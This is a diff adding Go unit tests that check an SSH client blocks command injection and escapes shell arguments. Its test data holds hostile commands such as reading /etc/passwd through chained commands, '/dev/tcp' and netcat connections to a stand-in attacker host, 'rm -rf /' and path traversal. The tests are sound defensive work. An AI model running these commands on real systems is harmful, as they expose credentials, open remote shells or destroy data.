@@ -714,3 +714,257 @@ func TestSSHClientIntegration(t *testing.T) {
 	// You would need to set up proper test credentials and server
 	t.Skip("Integration test requires real SSH server setup")
 }
+
+// TestCommandInjectionPrevention tests that command injection attacks are blocked
+func TestCommandInjectionPrevention(t *testing.T) {
+	// Start mock SSH server
+	server := NewMockSSHServer(t)
+	require.NoError(t, server.Start())
+	defer server.Stop()
+
+	// Parse server address
+	host, portStr, err := net.SplitHostPort(server.GetAddress())
+	require.NoError(t, err)
+
+	config := DefaultSSHClientConfig()
+	config.Host = host
+	config.Port = parseInt(portStr)
+	config.Username = "testuser"
+	config.Password = "testpass"
+	config.MaxRetries = 1
+	config.HostKeyCallback = testHostKeyCallback()
+
+	client, err := NewSSHClient(config, logger.Default())
+	require.NoError(t, err)
+	defer client.Close()
+
+	ctx := context.Background()
+
+	// Test cases for command injection attacks that should be BLOCKED
+	injectionAttempts := []struct {
+		name    string
+		command string
+	}{
+		{"pipe injection", "ls | cat /etc/passwd"},
+		{"command chaining with &&", "ls && cat /etc/passwd"},
+		{"command chaining with ||", "ls || cat /etc/passwd"},
+		{"semicolon injection", "ls; cat /etc/passwd"},
+		{"backtick injection", "ls `whoami`"},
+		{"dollar paren injection", "ls $(whoami)"},
+		{"dollar brace injection", "ls ${PATH}"},
+		{"newline injection", "ls\ncat /etc/passwd"},
+		{"carriage return injection", "ls\rcat /etc/passwd"},
+		{"network backdoor /dev/tcp", "cat /dev/tcp/attacker.com/4444"},
+		{"network backdoor /dev/udp", "cat /dev/udp/attacker.com/4444"},
+		{"netcat usage", "nc attacker.com 4444"},
+		{"proc fd trick", "cat /proc/self/fd/0"},
+	}
+
+	for _, tt := range injectionAttempts {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := client.ExecuteCommand(ctx, tt.command)
+			assert.Error(t, err, "Expected command injection attempt to be blocked: %s", tt.command)
+			assert.Contains(t, err.Error(), "command validation failed", "Expected validation failure message")
+		})
+	}
+}
+
+// TestSafeCommandExecution tests that safe commands are allowed
+func TestSafeCommandExecution(t *testing.T) {
+	// Start mock SSH server
+	server := NewMockSSHServer(t)
+	require.NoError(t, server.Start())
+	defer server.Stop()
+
+	// Set up expected commands for safe commands
+	server.SetCommandResponse("ls", CommandResponse{Stdout: "file.txt\n", ExitCode: 0})
+	server.SetCommandResponse("ls -la", CommandResponse{Stdout: "total 0\n", ExitCode: 0})
+	server.SetCommandResponse("cat /etc/hostname", CommandResponse{Stdout: "pi\n", ExitCode: 0})
+	server.SetCommandResponse("sudo cat /var/lib/rancher/k3s/server/node-token", CommandResponse{Stdout: "token\n", ExitCode: 0})
+	server.SetCommandResponse("mkdir -p /tmp/test", CommandResponse{ExitCode: 0})
+	server.SetCommandResponse("true", CommandResponse{ExitCode: 0})
+	server.SetCommandResponse("echo hello", CommandResponse{Stdout: "hello\n", ExitCode: 0})
+
+	// Parse server address
+	host, portStr, err := net.SplitHostPort(server.GetAddress())
+	require.NoError(t, err)
+
+	config := DefaultSSHClientConfig()
+	config.Host = host
+	config.Port = parseInt(portStr)
+	config.Username = "testuser"
+	config.Password = "testpass"
+	config.MaxRetries = 1
+	config.HostKeyCallback = testHostKeyCallback()
+
+	client, err := NewSSHClient(config, logger.Default())
+	require.NoError(t, err)
+	defer client.Close()
+
+	ctx := context.Background()
+
+	// Test cases for safe commands that should be ALLOWED
+	safeCommands := []string{
+		"ls",
+		"ls -la",
+		"cat /etc/hostname",
+		"sudo cat /var/lib/rancher/k3s/server/node-token",
+		"mkdir -p /tmp/test",
+		"true",
+		"echo hello",
+	}
+
+	for _, cmd := range safeCommands {
+		t.Run(cmd, func(t *testing.T) {
+			// Note: The mock server may return errors for unknown commands,
+			// but the validation itself should not block these
+			_, err := client.ExecuteCommand(ctx, cmd)
+			// We only check that validation passed - actual execution may fail
+			if err != nil {
+				assert.NotContains(t, err.Error(), "command validation failed",
+					"Safe command should not be blocked by validation: %s", cmd)
+			}
+		})
+	}
+}
+
+// TestExecuteSafeCommand tests the ExecuteSafeCommand function
+func TestExecuteSafeCommand(t *testing.T) {
+	// Start mock SSH server
+	server := NewMockSSHServer(t)
+	require.NoError(t, server.Start())
+	defer server.Stop()
+
+	// Set up expected command - the escaped version
+	server.SetCommandResponse("echo '$(whoami)'", CommandResponse{Stdout: "$(whoami)\n", ExitCode: 0})
+
+	// Parse server address
+	host, portStr, err := net.SplitHostPort(server.GetAddress())
+	require.NoError(t, err)
+
+	config := DefaultSSHClientConfig()
+	config.Host = host
+	config.Port = parseInt(portStr)
+	config.Username = "testuser"
+	config.Password = "testpass"
+	config.MaxRetries = 1
+	config.HostKeyCallback = testHostKeyCallback()
+
+	client, err := NewSSHClient(config, logger.Default())
+	require.NoError(t, err)
+	defer client.Close()
+
+	ctx := context.Background()
+
+	// Test that ExecuteSafeCommand properly escapes arguments
+	t.Run("escapes shell metacharacters in arguments", func(t *testing.T) {
+		// This should NOT cause command injection because args are escaped
+		_, err := client.ExecuteSafeCommand(ctx, "echo", "$(whoami)")
+		// The command should execute without injection
+		assert.NoError(t, err)
+	})
+
+	t.Run("rejects invalid base command", func(t *testing.T) {
+		_, err := client.ExecuteSafeCommand(ctx, "ls; rm -rf /", "arg")
+		assert.Error(t, err)
+		assert.Contains(t, err.Error(), "invalid command")
+	})
+}
+
+// TestShellEscape tests the ShellEscape function
+func TestShellEscape(t *testing.T) {
+	testCases := []struct {
+		input    string
+		expected string
+	}{
+		{"hello", "'hello'"},
+		{"hello world", "'hello world'"},
+		{"it's fine", "'it'\\''s fine'"},
+		{"$(whoami)", "'$(whoami)'"},
+		{"${PATH}", "'${PATH}'"},
+		{"`id`", "'`id`'"},
+		{"", "''"},
+		{"a;b", "'a;b'"},
+		{"a|b", "'a|b'"},
+		{"a&&b", "'a&&b'"},
+	}
+
+	for _, tc := range testCases {
+		t.Run(tc.input, func(t *testing.T) {
+			result := ShellEscape(tc.input)
+			assert.Equal(t, tc.expected, result)
+		})
+	}
+}
+
+// TestValidateBaseCommand tests the validateBaseCommand function
+func TestValidateBaseCommand(t *testing.T) {
+	validCommands := []string{
+		"ls",
+		"cat",
+		"/usr/bin/ls",
+		"/bin/cat",
+		"sudo",
+		"mkdir",
+	}
+
+	for _, cmd := range validCommands {
+		t.Run("valid: "+cmd, func(t *testing.T) {
+			err := validateBaseCommand(cmd)
+			assert.NoError(t, err)
+		})
+	}
+
+	invalidCommands := []struct {
+		cmd    string
+		reason string
+	}{
+		{"", "empty"},
+		{"ls;rm", "semicolon"},
+		{"ls|cat", "pipe"},
+		{"ls&&cat", "ampersand"},
+		{"$(whoami)", "command substitution"},
+		{"ls`id`", "backtick"},
+		{"../bin/ls", "path traversal"},
+	}
+
+	for _, tc := range invalidCommands {
+		t.Run("invalid: "+tc.reason, func(t *testing.T) {
+			err := validateBaseCommand(tc.cmd)
+			assert.Error(t, err)
+		})
+	}
+}
+
+// TestSanitizePath tests the SanitizePath function
+func TestSanitizePath(t *testing.T) {
+	validPaths := []struct {
+		input    string
+		expected string
+	}{
+		{"/var/lib/rancher", "/var/lib/rancher"},
+		{"/tmp/test", "/tmp/test"},
+		{"/home/pi/.ssh/authorized_keys", "/home/pi/.ssh/authorized_keys"},
+	}
+
+	for _, tc := range validPaths {
+		t.Run("valid: "+tc.input, func(t *testing.T) {
+			result, err := SanitizePath(tc.input)
+			assert.NoError(t, err)
+			assert.Equal(t, tc.expected, result)
+		})
+	}
+
+	invalidPaths := []string{
+		"",
+		"../etc/passwd",
+		"/var/lib/../etc/passwd",
+	}
+
+	for _, path := range invalidPaths {
+		t.Run("invalid: "+path, func(t *testing.T) {
+			_, err := SanitizePath(path)
+			assert.Error(t, err)
+		})
+	}
+}
